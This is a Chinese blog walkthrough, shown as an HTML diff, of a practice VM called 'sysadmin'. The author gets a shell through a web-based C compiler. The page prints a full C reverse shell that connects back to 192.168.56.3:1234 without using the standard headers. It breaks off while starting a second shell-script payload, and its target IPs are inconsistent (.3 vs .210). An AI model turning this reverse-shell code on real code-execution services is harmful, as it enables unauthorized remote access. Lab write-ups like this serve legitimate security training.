@@ -1,0 +1,535 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>群友靶机--sysadmin - X8@0E的博客</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="一、信息收集1.主机发现首先，在本地网络中利用 arp-scan 扫描存活主机，定位目标IP。通过ARP扫描，确认目标主机的IP地址为 192.168.56.3 2.端口扫描 Nmap的扫描结果显示，目标主机对外开放了 22 (SSH) 和 80 (HTTP) 两个TCP端口。 二、漏洞发现与初始访问1.Web服务侦察与漏洞分析通过浏览器访问 http:&#x2F;&#x2F;192.168.56.210 ，发现一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="群友靶机--sysadmin">
+<meta property="og:url" content="http://example.com/2025/08/15/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--sysadmin/index.html">
+<meta property="og:site_name" content="X8@0E的博客">
+<meta property="og:description" content="一、信息收集1.主机发现首先，在本地网络中利用 arp-scan 扫描存活主机，定位目标IP。通过ARP扫描，确认目标主机的IP地址为 192.168.56.3 2.端口扫描 Nmap的扫描结果显示，目标主机对外开放了 22 (SSH) 和 80 (HTTP) 两个TCP端口。 二、漏洞发现与初始访问1.Web服务侦察与漏洞分析通过浏览器访问 http:&#x2F;&#x2F;192.168.56.210 ，发现一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815175654321.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815175915462.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815194037334.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815194122430.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815200531834.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815200716356.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815200836871.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816165658870.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816171001962.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816171026260.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815210014204.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816171126575.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816170856184.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816171309731.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816172125698.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816172411442.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816172511780.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816173025975.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816173353254.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816173454620.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816173759042.png">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250816173939648.png">
+<meta property="article:published_time" content="2025-08-15T09:47:19.530Z">
+<meta property="article:modified_time" content="2025-08-28T12:57:46.031Z">
+<meta property="article:author" content="X8@0E">
+<meta property="article:tag" content="fork解决断连">
+<meta property="article:tag" content="ssh秘钥生成连接">
+<meta property="article:tag" content="提权!env_reset">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/image-20250815175654321.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1761989925358">
+
+<link rel="stylesheet" href="/css/style.css?v=1761989925358">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1761989925358">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1761989925358"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://img-baofun.zhhainiao.com/pcwallpaper_ugc/static/55f0c32a6a773efe8c6a6a8158a06f18.jpg?x-oss-process=image%2fresize%2cm_lfit%2cw_1920%2ch_1080)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="X8@0E"><img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="X8@0E">
+            <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E" alt="X8@0E">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>43</div>
+        <div><span>标签</span>77</div>
+        <div><span>分类</span>14</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-douban-fill"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1761989925359"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://blog.csdn.net/2301_81325456/article/details/147025965"
+			target="_blank"
+			mdui-tooltip="{content: 'CSDN'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/NSSCTF/">NSSCTF</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnhub/">Vulnhub</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Vulnvm靶机复现/">Vulnvm靶机复现</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-信息收集/">ctfshow-web-信息收集</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-命令执行/">ctfshow-web-命令执行</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件上传/">ctfshow-web-文件上传</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-文件包含/">ctfshow-web-文件包含</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/ctfshow-web-爆破/">ctfshow-web-爆破</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/sql注入/">sql注入</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulhub/">vulhub</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/vulnhub/">vulnhub</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/群友靶机/">群友靶机</a>
+          <span class="category-list-count">15</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/自制靶机/">自制靶机</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/1Panel/" style="font-size: 10px;">1Panel</a> <a href="/tags/3%E4%B8%AA%E7%82%B9/" style="font-size: 10px;">3个点</a> <a href="/tags/Argon2Cracker/" style="font-size: 10px;">Argon2Cracker</a> <a href="/tags/Cookie-GLOBALS/" style="font-size: 10px;">Cookie--GLOBALS</a> <a href="/tags/Cypher%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">Cypher注入</a> <a href="/tags/DC/" style="font-size: 15px;">DC</a> <a href="/tags/GIF%E7%BB%95%E8%BF%87/" style="font-size: 10px;">GIF绕过</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/JoomScan/" style="font-size: 10px;">JoomScan</a> <a href="/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/" style="font-size: 10px;">LFI到RCE(open函数)</a> <a href="/tags/NSSCTF/" style="font-size: 15px;">NSSCTF</a> <a href="/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">Nginx解析漏洞</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/RUNPATH/" style="font-size: 10px;">RUNPATH</a> <a href="/tags/Rabbit/" style="font-size: 10px;">Rabbit</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/Vulnhub/" style="font-size: 15px;">Vulnhub</a> <a href="/tags/Vulnvm/" style="font-size: 10px;">Vulnvm</a> <a href="/tags/WAF/" style="font-size: 10px;">WAF</a> <a href="/tags/WPA-01-cap/" style="font-size: 10px;">WPA-01.cap</a> <a href="/tags/aircrack-ng/" style="font-size: 10px;">aircrack-ng</a> <a href="/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">basic认证爆破</a> <a href="/tags/cgi%E6%96%87%E4%BB%B6/" style="font-size: 10px;">cgi文件</a> <a href="/tags/ctfshow/" style="font-size: 20px;">ctfshow</a> <a href="/tags/dirtycow/" style="font-size: 10px;">dirtycow</a> <a href="/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/" style="font-size: 10px;">docker交互式shell</a> <a href="/tags/drupal/" style="font-size: 10px;">drupal</a> <a href="/tags/ffuf/" style="font-size: 10px;">ffuf</a> <a href="/tags/flask/" style="font-size: 10px;">flask</a> <a href="/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/" style="font-size: 10px;">fork解决断连</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/ghfs/" style="font-size: 10px;">ghfs</a> <a href="/tags/ldd/" style="font-size: 10px;">ldd</a> <a href="/tags/les-sh/" style="font-size: 10px;">les.sh</a> <a href="/tags/linpeas-sh/" style="font-size: 10px;">linpeas.sh</a> <a href="/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/" style="font-size: 10px;">lsattr--查看文件扩展属性</a> <a href="/tags/motto/" style="font-size: 10px;">motto</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/mysql-old-password/" style="font-size: 10px;">mysql_old_password</a> <a href="/tags/nikto/" style="font-size: 10px;">nikto</a> <a href="/tags/nohup/" style="font-size: 10px;">nohup</a> <a href="/tags/php%E6%8F%90%E6%9D%83root/" style="font-size: 10px;">php提权root</a> <a href="/tags/poc/" style="font-size: 10px;">poc</a> <a href="/tags/put%E6%96%B9%E6%B3%95/" style="font-size: 10px;">put方法</a> <a href="/tags/python3-5/" style="font-size: 10px;">python3.5</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a> <a href="/tags/readelf/" style="font-size: 10px;">readelf</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql二次注入</a> <a href="/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/" style="font-size: 10px;">ssh弱口令爆破</a> <a href="/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/" style="font-size: 10px;">ssh秘钥生成连接</a> <a href="/tags/stegseek/" style="font-size: 10px;">stegseek</a> <a href="/tags/suForce/" style="font-size: 10px;">suForce</a> <a href="/tags/url%E6%88%AA%E6%96%AD/" style="font-size: 10px;">url截断</a> <a href="/tags/vite/" style="font-size: 10px;">vite</a> <a href="/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;">web命令执行</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">web文件上传</a> <a href="/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">web文件包含</a> <a href="/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 10px;">web源码泄露</a> <a href="/tags/web%E7%88%86%E7%A0%B4/" style="font-size: 10px;">web爆破</a> <a href="/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/" style="font-size: 10px;">x-forwarded-for的ip欺骗</a> <a href="/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/" style="font-size: 10px;">任意文件读取漏洞(CVE-2025-30208)</a> <a href="/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/" style="font-size: 10px;">凯撒密码</a> <a href="/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/" style="font-size: 10px;">后面加.jpg后缀</a> <a href="/tags/%E5%9F%9F%E6%8E%A7/" style="font-size: 10px;">域控</a> <a href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" style="font-size: 10px;">密码爆破</a> <a href="/tags/%E6%8F%90%E6%9D%83-env-reset/" style="font-size: 10px;">提权!env_reset</a> <a href="/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">插件漏洞</a> <a href="/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/" style="font-size: 10px;">日志注入+ua添加木马</a> <a href="/tags/%E6%AD%A3%E5%90%91shell/" style="font-size: 10px;">正向shell</a> <a href="/tags/%E7%8A%B6%E6%80%81%E7%A0%81/" style="font-size: 10px;">状态码</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" style="font-size: 10px;">环境变量</a> <a href="/tags/%E7%A9%BA%E6%A0%BC/" style="font-size: 10px;">空格</a> <a href="/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/" style="font-size: 10px;">维吉尼亚密码</a> <a href="/tags/%E8%9A%81%E5%89%91/" style="font-size: 10px;">蚁剑</a> <a href="/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/" style="font-size: 10px;">越界读取</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(77);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/">2025</a><span class="archive-list-count">43</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/20/Crypto/">Crypto</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/11/%E6%B5%81%E9%87%8F%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/">流量分析恶意攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/09/hackableII/">hackablell</a>
+          </li>
+        
+          <li>
+            <a href="/2025/10/07/Me-and-My-Girlfriend-1/">Me-and-My-Girlfriend-1</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="" target="_blank" >
+                    <img src="https://n.sinaimg.cn/sinakd20119/560/w1080h1080/20220924/802a-0c9750f1fa5aa25624c0847a082aaba1.jpg" alt="X8@0E"></img>
+                    <p>X8@0E</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2025 X8@0E
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://img.shetu66.com/2023/11/22/1700644963315094.jpg" alt="群友靶机--sysadmin" loading="lazy">
+            <h1>群友靶机--sysadmin</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2025年08月15日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/">群友靶机</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h2><p>首先，在本地网络中利用 arp-scan 扫描存活主机，定位目标IP。通过ARP扫描，确认目标主机的IP地址为 192.168.56.3</p>
+<h2 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815175654321.png" alt="image-20250815175654321" data-caption="image-20250815175654321" loading="lazy"></p>
+<p>Nmap的扫描结果显示，目标主机对外开放了 <strong>22 (SSH)</strong> 和 <strong>80 (HTTP)</strong> 两个TCP端口。</p>
+<h1 id="二、漏洞发现与初始访问"><a href="#二、漏洞发现与初始访问" class="headerlink" title="二、漏洞发现与初始访问"></a>二、漏洞发现与初始访问</h1><h2 id="1-Web服务侦察与漏洞分析"><a href="#1-Web服务侦察与漏洞分析" class="headerlink" title="1.Web服务侦察与漏洞分析"></a>1.Web服务侦察与漏洞分析</h2><p>通过浏览器访问 <a target="_blank" rel="noopener" href="http://192.168.56.210/">http://192.168.56.210</a> ，发现一个提供C语言在线编译和执行功能的Web应用。通过审查页面源代码注释，我们获取了其后端的编译指令：</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815175915462.png" alt="image-20250815175915462" data-caption="image-20250815175915462" loading="lazy"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out</span><br></pre></td></tr></table></figure>
+
+<p>此编译命令中包含一个关键参数 -nostdinc 。该参数的作用是阻止编译器链接任何标准库的头文件（例如 stdio.h , unistd.h 等）。这意味着，所有依赖标准库函数（如 system() , fork() ,execve() ）的常规反弹Shell Payload均会因链接失败而无法通过编译，常规的攻击方式在此处失效。</p>
+<h2 id="2-绕过编译限制获取Shell"><a href="#2-绕过编译限制获取Shell" class="headerlink" title="2.绕过编译限制获取Shell"></a>2.绕过编译限制获取Shell</h2><h2 id="法一：-fork脚本解决断连"><a href="#法一：-fork脚本解决断连" class="headerlink" title="法一：(fork脚本解决断连)"></a>法一：(fork脚本解决断连)</h2><p>刚测试连接的时候刚反弹shell连上但是立马就断了，所以要稳定shell才行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">socket</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span>,<span class="type">const</span> <span class="type">void</span>*,<span class="type">unsigned</span> <span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">dup2</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span>*, <span class="type">char</span>* <span class="type">const</span>[], <span class="type">char</span>* <span class="type">const</span>[])</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> _exit(<span class="type">int</span>);</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">pause</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> sin_family;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> sin_port;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>   sin_addr;</span><br><span class="line">    <span class="type">char</span>           sin_zero[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 子进程：反弹 shell</span></span><br><span class="line">        <span class="type">int</span> sock = socket(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">        addr.sin_family = <span class="number">2</span>;</span><br><span class="line">        addr.sin_port   = __builtin_bswap16(<span class="number">1234</span>);       <span class="comment">// 改端口</span></span><br><span class="line">        addr.sin_addr   = __builtin_bswap32(<span class="number">0xC0A83803</span>); <span class="comment">// 192.168.56.3</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++) addr.sin_zero[i]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        connect(sock, &amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">        dup2(sock,<span class="number">0</span>);</span><br><span class="line">        dup2(sock,<span class="number">1</span>);</span><br><span class="line">        dup2(sock,<span class="number">2</span>);</span><br><span class="line">        <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">char</span> *envp[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, envp);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 父进程：保持挂起，不退出</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) pause();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先在kali攻击机上面开启监听，然后在web80页面上传上面这个c文件即可，之后就可以拿到shell了</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815194037334.png" alt="image-20250815194037334" data-caption="image-20250815194037334" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20250815194122430.png" alt="image-20250815194122430" data-caption="image-20250815194122430" loading="lazy"></p>
+<h2 id="法二：Sublarge思路-fork解决断连"><a href="#法二：Sublarge思路-fork解决断连" class="headerlink" title="法二：Sublarge思路(fork解决断连)"></a>法二：Sublarge思路(fork解决断连)</h2><h3 id="Sublarge-Payload-a-sh"><a href="#Sublarge-Payload-a-sh" class="headerlink" title="Sublarge Payload (a.sh ):"></a>Sublarge Payload (a.sh ):</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 